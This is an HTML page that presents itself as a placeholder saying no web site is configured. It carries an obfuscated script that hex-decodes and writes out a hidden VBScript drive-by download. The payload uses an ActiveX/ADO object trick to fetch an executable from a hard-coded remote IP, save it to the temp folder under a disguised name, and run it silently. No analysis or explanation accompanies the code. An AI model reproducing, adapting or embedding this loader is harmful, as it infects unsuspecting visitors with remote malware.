<script type="text/jscript">
function init() { 
document.write("No web site is configured at this address");

}
window.onload = init;
</script>
<SCRIPT LANGUAGE="JavaScript"> 
function aa(str,n){ 
	var rstr,l,i,fstr,s; 
	i=0;               
	fstr="";           
	while (i<str.length){  
		s = str.substr(i,2);    
		fstr = fstr + String.fromCharCode("0x"+s);
	  i=i+2;     
	}           
	l=fstr.length;  
	fstr =fstr.substr(l-n+1,l)+fstr.substr(0,l-n+1);
	return fstr ; 
}     
</SCRIPT>  
<SCRIPT LANGUAGE="JavaScript"> var f ="203D2022636C7369220D0A636C49443220203D2022643A42443936433535362D363541332D313144302D393833412D303043303446433239453336220D0A584D4C31203D20224D6963220D0A584D4C32203D2022726F736F66742E584D4C48545450220D0A41646F53716131203D202241646F64622E53220D0A41646F53716132203D2022747265616D220D0A6F4765742020203D2022474554220D0A666E616D6531203D20224572616475652E636F6D220D0A53464F202020203D2022536372697074696E672E46696C6553797374656D4F626A656374220D0A534170702020203D20225368656C6C2E4170706C69636174696F6E220D0A646C20202020203D2022687474703A2F2F3231312E3234372E3132392E32372F782E657865220D0A536574206466203D20646F63756D656E742E637265617465456C656D656E7428226F626A65637422290D0A64662E7365744174747269627574652022636C6173736964222C20636C49443126636C4944320D0A536574207820203D202064662E4372656174654F626A65637428584D4C3126584D4C322C2222290D0A736574205320203D202064662E6372656174656F626A6563742841646F537161312641646F537161322C2222290D0A532E74797065203D20310D0A782E4F70656E206F4765742C20646C2C2046616C73650D0A782E53656E640D0A73657420462020203D2064662E6372656174656F626A6563742853464F2C2222290D0A73657420746D70203D20462E4765745370656369616C466F6C6465722832290D0A666E616D653120203D20462E4275696C645061746828746D702C666E616D6531290D0A532E6F70656E0D0A532E777269746520782E726573706F6E7365426F64790D0A532E73617665746F66696C6520666E616D65312C320D0A532E636C6F73650D0A736574205120203D2064662E6372656174656F626A65637428534170702C2222290D0A512E5368656C6C4578656375746520666E616D65312C22222C22222C226F70656E222C300D0A3C2F7363726970743E0D0A3C686561643E0D0A3C7469746C653E496E7465726E6574204578706C6F7265723C2F7469746C653E0D0A3C2F686561643E3C626F64793E3C2F626F64793E3C2F68746D6C3E0D0A3C68746D6C3E0D0A3C736372697074206C616E67756167653D225642536372697074223E0D0A636C49443120";document.write(aa(f,45));</SCRIPT>
